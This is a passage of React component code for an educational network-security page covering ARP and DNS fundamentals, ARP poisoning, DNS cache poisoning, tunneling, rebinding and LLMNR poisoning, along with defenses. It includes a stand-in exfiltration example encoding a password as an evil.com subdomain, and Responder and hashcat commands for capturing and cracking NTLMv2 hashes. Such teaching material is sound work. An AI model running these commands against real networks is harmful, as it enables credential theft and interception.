                      <Typography variant="body2">Default timeout: 15-45 seconds (reachable)</Typography>
                      <Typography variant="body2">Unreachable timeout: varies by version</Typography>
                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
                        Command: <code>arp -a</code>
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>Linux</Typography>
                      <Typography variant="body2">Base reachable time: 30 seconds</Typography>
                      <Typography variant="body2">Garbage collection: configurable</Typography>
                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
                        Command: <code>ip neigh show</code>
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6" }}>Cisco IOS</Typography>
                      <Typography variant="body2">Default timeout: 4 hours</Typography>
                      <Typography variant="body2">Configurable per interface</Typography>
                      <Typography variant="caption" sx={{ mt: 1, display: "block" }}>
                        Command: <code>show ip arp</code>
                      </Typography>
                    </Paper>
                  </Grid>
                </Grid>
              </Box>

              <Alert severity="error" sx={{ mt: 3 }}>
                <AlertTitle>🚨 The Fundamental Security Flaw</AlertTitle>
                <Typography variant="body2">
                  ARP was designed in 1982 when the internet was a trusted academic network. It has <strong>NO authentication mechanism</strong>. 
                  Devices blindly accept ANY ARP reply, even if they didn't ask for it. This means:
                </Typography>
                <List dense sx={{ mt: 1 }}>
                  <ListItem sx={{ py: 0 }}><ListItemText primary="• Anyone on the network can claim to be any IP address" /></ListItem>
                  <ListItem sx={{ py: 0 }}><ListItemText primary="• There's no verification of who sent the ARP message" /></ListItem>
                  <ListItem sx={{ py: 0 }}><ListItemText primary="• The most recent reply wins — attackers can constantly re-poison" /></ListItem>
                </List>
              </Alert>
            </Paper>

            {/* ==================== ARP ATTACKS ==================== */}
            <Paper id="arp-attacks" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} />
                ARP Poisoning Attacks
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                ARP poisoning (also called ARP spoofing) exploits the trusting nature of ARP to insert false entries into
                victims' ARP caches. This positions the attacker as a man-in-the-middle, enabling traffic interception,
                modification, and credential theft.
              </Typography>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Attack Stages</Typography>
              <Grid container spacing={2} sx={{ mb: 4 }}>
                {arpAttackStages.map((stage, idx) => (
                  <Grid item xs={12} sm={6} md={4} key={idx}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%", border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                        <Box sx={{ color: "#ef4444" }}>{stage.icon}</Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                          {idx + 1}. {stage.stage}
                        </Typography>
                      </Box>
                      <Typography variant="body2" color="text.secondary">{stage.description}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Attack Variants</Typography>
              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha(accent, 0.02), borderRadius: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2 }}>Classic MITM Attack</Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      The attacker poisons both the victim and the gateway, positioning themselves to intercept all traffic.
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Victim thinks attacker is gateway" /></ListItem>
                      <ListItem><ListItemText primary="• Gateway thinks attacker is victim" /></ListItem>
                      <ListItem><ListItemText primary="• All traffic flows through attacker" /></ListItem>
                      <ListItem><ListItemText primary="• Requires IP forwarding enabled" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha(accent, 0.02), borderRadius: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2 }}>Denial of Service</Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      Without IP forwarding, ARP poisoning causes traffic to be dropped, creating a denial of service.
                    </Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Traffic redirected to non-forwarding host" /></ListItem>
                      <ListItem><ListItemText primary="• Packets dropped silently" /></ListItem>
                      <ListItem><ListItemText primary="• Network connectivity lost" /></ListItem>
                      <ListItem><ListItemText primary="• Difficult to diagnose" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>What Attackers Can Capture</Typography>
                <Grid container spacing={2}>
                  {[
                    { item: "Unencrypted credentials", risk: "Critical", examples: "HTTP forms, FTP, Telnet" },
                    { item: "Session cookies", risk: "High", examples: "Web sessions, tokens" },
                    { item: "Email content", risk: "High", examples: "SMTP, POP3, IMAP" },
                    { item: "File transfers", risk: "Medium", examples: "SMB, NFS shares" },
                    { item: "Metadata", risk: "Medium", examples: "Connection patterns, timing" },
                    { item: "DNS queries", risk: "Medium", examples: "Browsing activity" },
                  ].map((item, idx) => (
                    <Grid item xs={12} sm={6} md={4} key={idx}>
                      <Paper sx={{ p: 2, borderRadius: 2, border: `1px solid ${alpha(item.risk === "Critical" ? "#ef4444" : item.risk === "High" ? "#f59e0b" : "#3b82f6", 0.2)}` }}>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.item}</Typography>
                        <Chip label={item.risk} size="small" sx={{ my: 0.5, bgcolor: alpha(item.risk === "Critical" ? "#ef4444" : item.risk === "High" ? "#f59e0b" : "#3b82f6", 0.1) }} />
                        <Typography variant="caption" display="block" color="text.secondary">{item.examples}</Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Box>
            </Paper>

            {/* ==================== DNS FUNDAMENTALS ==================== */}
            <Paper id="dns-fundamentals" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DnsIcon sx={{ color: "#22c55e" }} />
                DNS Fundamentals
              </Typography>

              {/* Beginner Analogy */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `2px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                  📖 The Library Card Catalog Analogy
                </Typography>
                <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                  Imagine the internet as a <strong>massive library</strong> with billions of books (websites):
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📚</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Domain Name = Book Title</Typography>
                      <Typography variant="body2" color="text.secondary">
                        "google.com" is like asking for "Encyclopedia of Search"
                      </Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>🗃️</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>DNS = Card Catalog</Typography>
                      <Typography variant="body2" color="text.secondary">
                        The system that tells you "that book is in Aisle 142.250.80.14"
                      </Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography sx={{ fontSize: "2.5rem", mb: 1 }}>📍</Typography>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>IP Address = Shelf Location</Typography>
                      <Typography variant="body2" color="text.secondary">
                        The actual physical location where the book lives
                      </Typography>
                    </Box>
                  </Grid>
                </Grid>
                <Alert severity="warning" sx={{ mt: 2 }}>
                  <Typography variant="body2">
                    <strong>The Security Problem:</strong> What if someone switched the card in the catalog? You'd ask for 
                    "Encyclopedia of Search" but get sent to "Scammer's Fake Book" that looks identical but steals your library card!
                  </Typography>
                </Alert>
              </Paper>

              {/* Why DNS Matters */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  🌐 Why DNS is Critical Infrastructure
                </Typography>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  DNS is often called "the phone book of the internet" — but it's actually more critical than that. 
                  Without DNS, you'd have to memorize IP addresses like 142.250.80.14 instead of typing google.com.
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} sm={6} md={3}>
                    <Box sx={{ textAlign: "center" }}>
                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>4.3B+</Typography>
                      <Typography variant="caption">DNS queries per day (Google alone)</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Box sx={{ textAlign: "center" }}>
                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>13</Typography>
                      <Typography variant="caption">Root name server clusters worldwide</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Box sx={{ textAlign: "center" }}>
                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>&lt;50ms</Typography>
                      <Typography variant="caption">Typical DNS query resolution time</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Box sx={{ textAlign: "center" }}>
                      <Typography variant="h4" sx={{ fontWeight: 700, color: "#3b82f6" }}>1983</Typography>
                      <Typography variant="caption">Year DNS was invented (RFC 882)</Typography>
                    </Box>
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                The Domain Name System (DNS) is a hierarchical distributed naming system that translates human-readable
                domain names (like example.com) into IP addresses that computers use to communicate. Every time you visit 
                a website, send an email, or use almost any internet service, DNS is working behind the scenes.
              </Typography>

              {/* DNS Hierarchy Explained */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  🏗️ The DNS Hierarchy (Reading Right to Left)
                </Typography>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  A domain name like <code>www.example.com</code> is actually read <strong>right to left</strong> by DNS:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "1rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1, textAlign: "center", mb: 2 }}>
                  <Typography component="span">www</Typography>
                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
                  <Typography component="span" sx={{ color: "#3b82f6", fontWeight: 700 }}>example</Typography>
                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
                  <Typography component="span" sx={{ color: "#22c55e", fontWeight: 700 }}>com</Typography>
                  <Typography component="span" sx={{ color: "text.secondary" }}>.</Typography>
                  <Typography component="span" sx={{ color: "#ef4444", fontWeight: 700 }}>(root)</Typography>
                </Box>
                <Grid container spacing={2}>
                  <Grid item xs={6} md={3}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444" }}>Root Zone (.)</Typography>
                    <Typography variant="caption" color="text.secondary">
                      Top of hierarchy. 13 clusters worldwide managed by ICANN.
                    </Typography>
                  </Grid>
                  <Grid item xs={6} md={3}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>TLD (.com, .org)</Typography>
                    <Typography variant="caption" color="text.secondary">
                      Top-Level Domain. Managed by registries (Verisign for .com).
                    </Typography>
                  </Grid>
                  <Grid item xs={6} md={3}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Domain (example)</Typography>
                    <Typography variant="caption" color="text.secondary">
                      Your registered domain. You control its DNS records.
                    </Typography>
                  </Grid>
                  <Grid item xs={6} md={3}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Subdomain (www)</Typography>
                    <Typography variant="caption" color="text.secondary">
                      Optional prefix you create (mail, blog, api, etc.)
                    </Typography>
                  </Grid>
                </Grid>
              </Paper>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Resolution Process (Detailed)</Typography>
                  <List>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>1</Typography></ListItemIcon>
                      <ListItemText
                        primary="User types example.com in browser"
                        secondary="Browser checks its cache → OS cache → hosts file first"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>2</Typography></ListItemIcon>
                      <ListItemText
                        primary="Query sent to recursive resolver"
                        secondary="Usually your ISP or configured DNS (8.8.8.8, 1.1.1.1)"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>3</Typography></ListItemIcon>
                      <ListItemText
                        primary="Resolver checks its cache"
                        secondary="If cached and not expired (TTL), returns immediately"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>4</Typography></ListItemIcon>
                      <ListItemText
                        primary="Resolver queries root servers"
                        secondary="Root says 'I don't know, but .com TLD is at 192.5.6.30'"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>5</Typography></ListItemIcon>
                      <ListItemText
                        primary="Resolver queries .com TLD"
                        secondary="TLD says 'example.com NS is at ns1.example.com'"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>6</Typography></ListItemIcon>
                      <ListItemText
                        primary="Resolver queries authoritative NS"
                        secondary="Authoritative server returns: 'example.com A 93.184.216.34'"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>7</Typography></ListItemIcon>
                      <ListItemText
                        primary="Result cached at each level"
                        secondary="Cached based on TTL (Time To Live) value"
                      />
                    </ListItem>
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Record Types</Typography>
                  <TableContainer component={Paper} sx={{ bgcolor: alpha("#22c55e", 0.02) }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                          <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
                          <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        <TableRow><TableCell>A</TableCell><TableCell>IPv4 address</TableCell><TableCell>93.184.216.34</TableCell></TableRow>
                        <TableRow><TableCell>AAAA</TableCell><TableCell>IPv6 address</TableCell><TableCell>2606:2800:220:1::1</TableCell></TableRow>
                        <TableRow><TableCell>CNAME</TableCell><TableCell>Alias/canonical name</TableCell><TableCell>www → example.com</TableCell></TableRow>
                        <TableRow><TableCell>MX</TableCell><TableCell>Mail servers</TableCell><TableCell>mail.example.com</TableCell></TableRow>
                        <TableRow><TableCell>NS</TableCell><TableCell>Nameservers</TableCell><TableCell>ns1.example.com</TableCell></TableRow>
                        <TableRow><TableCell>TXT</TableCell><TableCell>Text records</TableCell><TableCell>SPF, DKIM, verification</TableCell></TableRow>
                        <TableRow><TableCell>PTR</TableCell><TableCell>Reverse lookup</TableCell><TableCell>IP → hostname</TableCell></TableRow>
                        <TableRow><TableCell>SOA</TableCell><TableCell>Zone authority</TableCell><TableCell>Primary NS info</TableCell></TableRow>
                      </TableBody>
                    </Table>
                  </TableContainer>
                  
                  {/* Common DNS Servers */}
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 3, mb: 1 }}>Popular Public DNS Servers</Typography>
                  <Grid container spacing={1}>
                    {[
                      { name: "Google", primary: "8.8.8.8", secondary: "8.8.4.4" },
                      { name: "Cloudflare", primary: "1.1.1.1", secondary: "1.0.0.1" },
                      { name: "Quad9", primary: "9.9.9.9", secondary: "149.112.112.112" },
                      { name: "OpenDNS", primary: "208.67.222.222", secondary: "208.67.220.220" },
                    ].map((dns) => (
                      <Grid item xs={6} key={dns.name}>
                        <Paper sx={{ p: 1, bgcolor: alpha("#22c55e", 0.02), borderRadius: 1 }}>
                          <Typography variant="caption" sx={{ fontWeight: 700 }}>{dns.name}</Typography>
                          <Typography variant="caption" display="block" sx={{ fontFamily: "monospace", fontSize: "0.7rem" }}>
                            {dns.primary} / {dns.secondary}
                          </Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </Grid>
              </Grid>

              <Box sx={{ mt: 4 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Security Protocols Comparison</Typography>
                <TableContainer component={Paper} sx={{ bgcolor: alpha(theme.palette.background.paper, 0.5) }}>
                  <Table>
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ fontWeight: 700 }}>Protocol</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Port</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Encryption</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>MITM Protection</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {protocolComparison.map((proto, idx) => (
                        <TableRow key={idx}>
                          <TableCell sx={{ fontWeight: 600 }}>{proto.protocol}</TableCell>
                          <TableCell>{proto.port}</TableCell>
                          <TableCell>{proto.encryption}</TableCell>
                          <TableCell>
                            <Chip
                              label={proto.mitm}
                              size="small"
                              sx={{
                                bgcolor: proto.mitm === "Protected"
                                  ? alpha("#22c55e", 0.1)
                                  : alpha("#ef4444", 0.1),
                                color: proto.mitm === "Protected" ? "#22c55e" : "#ef4444",
                                fontWeight: 600,
                              }}
                            />
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Box>
            </Paper>

            {/* ==================== DNS ATTACKS ==================== */}
            <Paper id="dns-attacks" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#f59e0b", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <WarningIcon sx={{ color: "#f59e0b" }} />
                DNS Attack Techniques
              </Typography>

              {/* Attack Surface Overview */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, border: `2px solid ${alpha("#f59e0b", 0.2)}` }}>
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                  🎯 Understanding the DNS Attack Surface
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
                  DNS attacks can happen at <strong>seven different points</strong> in the resolution process. Understanding 
                  where attacks occur helps you defend against them:
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { step: "1", location: "Your Computer", attack: "Hosts file modification, malware", icon: "💻" },
                    { step: "2", location: "Local Network", attack: "ARP spoofing + DNS redirect, DHCP attacks", icon: "🏠" },
                    { step: "3", location: "ISP Resolver", attack: "Cache poisoning, BGP hijacking", icon: "🏢" },
                    { step: "4", location: "Internet Transit", attack: "BGP hijacking, route manipulation", icon: "🌐" },
                    { step: "5", location: "TLD Servers", attack: "DDoS, registrar compromise", icon: "🏛️" },
                    { step: "6", location: "Authoritative NS", attack: "Zone transfer, registrar hijacking", icon: "📋" },
                    { step: "7", location: "Application", attack: "DNS rebinding, subdomain takeover", icon: "📱" },
                  ].map((item) => (
                    <Grid item xs={6} sm={4} md={12/7} key={item.step}>
                      <Box sx={{ textAlign: "center", p: 1 }}>
                        <Typography sx={{ fontSize: "1.5rem" }}>{item.icon}</Typography>
                        <Typography variant="caption" sx={{ fontWeight: 700 }}>{item.step}. {item.location}</Typography>
                        <Typography variant="caption" display="block" color="text.secondary" sx={{ fontSize: "0.65rem" }}>
                          {item.attack}
                        </Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                DNS attacks exploit weaknesses in the domain name resolution system to redirect users, exfiltrate data,
                or cause denial of service. These attacks can occur at various points in the DNS hierarchy.
              </Typography>

              <Grid container spacing={2} sx={{ mb: 4 }}>
                {dnsAttackTypes.map((attack, idx) => (
                  <Grid item xs={12} sm={6} md={4} key={idx}>
                    <Paper sx={{ p: 2.5, borderRadius: 2, height: "100%", border: `1px solid ${alpha("#f59e0b", 0.15)}` }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1 }}>{attack.type}</Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1.5 }}>{attack.desc}</Typography>
                      <Box sx={{ display: "flex", gap: 1 }}>
                        <Chip
                          label={attack.severity}
                          size="small"
                          sx={{
                            bgcolor: alpha(
                              attack.severity === "Critical" ? "#ef4444" :
                              attack.severity === "High" ? "#f59e0b" : "#3b82f6",
                              0.1
                            ),
                            fontWeight: 600,
                          }}
                        />
                        <Chip label={attack.vector} size="small" variant="outlined" />
                      </Box>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Cache Poisoning Deep Dive</Typography>
              <Paper sx={{ p: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, mb: 3 }}>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  DNS cache poisoning inserts false records into a resolver's cache. When successful, all clients using
                  that resolver receive the poisoned response until the TTL expires.
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Attack Requirements</Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Guess or predict transaction ID (16-bit)" /></ListItem>
                      <ListItem><ListItemText primary="• Guess source port (historically predictable)" /></ListItem>
                      <ListItem><ListItemText primary="• Respond before legitimate server" /></ListItem>
                      <ListItem><ListItemText primary="• Match query name exactly" /></ListItem>
                    </List>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Kaminsky Attack Impact</Typography>
                    <List dense>
                      <ListItem><ListItemText primary="• Could poison any domain, not just queried" /></ListItem>
                      <ListItem><ListItemText primary="• Exploited additional section injection" /></ListItem>
                      <ListItem><ListItemText primary="• Required coordinated industry response" /></ListItem>
                      <ListItem><ListItemText primary="• Led to source port randomization" /></ListItem>
                    </List>
                  </Grid>
                </Grid>
              </Paper>

              {/* DNS Tunneling Explained */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  🕳️ DNS Tunneling: The Covert Channel
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
                  DNS tunneling encodes data in DNS queries and responses to bypass firewalls. Since most firewalls 
                  allow DNS (port 53), attackers use it to exfiltrate data or establish command-and-control channels.
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>How Data is Hidden</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
                      <Typography variant="caption" color="text.secondary" display="block">Legitimate query:</Typography>
                      <Typography sx={{ fontFamily: "monospace" }}>www.example.com</Typography>
                      <Typography variant="caption" color="text.secondary" display="block" sx={{ mt: 1 }}>Tunneled data (Base64 encoded):</Typography>
                      <Typography sx={{ fontFamily: "monospace", color: "#ef4444" }}>c3RvbGVuLXBhc3N3b3Jk.evil.com</Typography>
                      <Typography variant="caption" display="block" sx={{ mt: 1 }}>
                        ↑ "stolen-password" encoded in subdomain
                      </Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Detection Indicators</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• High volume of DNS queries" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Unusual TXT record requests" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Long, random-looking subdomains" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Queries to newly registered domains" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• High entropy in domain names" /></ListItem>
                    </List>
                  </Grid>
                </Grid>
                <Alert severity="info" sx={{ mt: 2 }}>
                  <Typography variant="body2">
                    <strong>Tools:</strong> iodine, dnscat2, dns2tcp are popular DNS tunneling tools used in red team engagements.
                  </Typography>
                </Alert>
              </Paper>

              {/* DNS Rebinding Attack */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                  🔁 DNS Rebinding: Bypassing Same-Origin Policy
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
                  DNS rebinding is a sophisticated attack that bypasses the browser's same-origin policy. The attacker 
                  controls a domain that initially resolves to their server, then "rebinds" to an internal IP address, 
                  allowing JavaScript to interact with internal services.
                </Typography>
                <Box sx={{ mb: 2 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Attack Timeline</Typography>
                  <Grid container spacing={1}>
                    {[
                      { step: "1", desc: "Victim visits attacker.com (resolves to 1.2.3.4)", color: "#22c55e" },
                      { step: "2", desc: "JavaScript loaded from attacker's server", color: "#22c55e" },
                      { step: "3", desc: "Attacker's DNS TTL expires (set very low)", color: "#f59e0b" },
                      { step: "4", desc: "attacker.com now resolves to 192.168.1.1 (internal router)", color: "#ef4444" },
                      { step: "5", desc: "Same-origin: JavaScript can now access internal router!", color: "#ef4444" },
                    ].map((item) => (
                      <Grid item xs={12} key={item.step}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                          <Box sx={{ width: 24, height: 24, borderRadius: "50%", bgcolor: alpha(item.color, 0.2), display: "flex", alignItems: "center", justifyContent: "center" }}>
                            <Typography variant="caption" sx={{ fontWeight: 700, color: item.color }}>{item.step}</Typography>
                          </Box>
                          <Typography variant="body2">{item.desc}</Typography>
                        </Box>
                      </Grid>
                    ))}
                  </Grid>
                </Box>
                <Alert severity="warning">
                  <Typography variant="body2">
                    <strong>Defense:</strong> DNS rebinding defenses include DNS pinning, validating Host headers, 
                    and using firewalls that block DNS responses pointing to internal IPs.
                  </Typography>
                </Alert>
              </Paper>

              {/* Windows-Specific: LLMNR/NBT-NS/mDNS */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#0078d4", 0.05), borderRadius: 2, border: `1px solid ${alpha("#0078d4", 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0078d4" }}>
                  🪟 LLMNR/NBT-NS/mDNS Poisoning (Windows Networks)
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
                  When DNS fails to resolve a hostname, Windows falls back to <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) 
                  and <strong>NBT-NS</strong> (NetBIOS Name Service). Attackers on the local network can respond to these broadcasts 
                  and capture NTLMv2 hashes.
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>LLMNR</Typography>
                      <Typography variant="caption" display="block">UDP 5355</Typography>
                      <Typography variant="caption" color="text.secondary">IPv6 & IPv4 multicast</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>NBT-NS</Typography>
                      <Typography variant="caption" display="block">UDP 137</Typography>
                      <Typography variant="caption" color="text.secondary">Legacy NetBIOS broadcasts</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Box sx={{ textAlign: "center", p: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>mDNS</Typography>
                      <Typography variant="caption" display="block">UDP 5353</Typography>
                      <Typography variant="caption" color="text.secondary">Bonjour/Avahi services</Typography>
                    </Box>
                  </Grid>
                </Grid>
                <CodeBlock
                  language="bash"
                  code={`# Attack with Responder (Kali)
sudo responder -I eth0 -wrf

# Captured hashes can be cracked with hashcat
hashcat -m 5600 hashes.txt wordlist.txt

# Disable via Group Policy
Computer Config → Admin Templates → Network → DNS Client
  → Turn off multicast name resolution → Enabled`}
                />
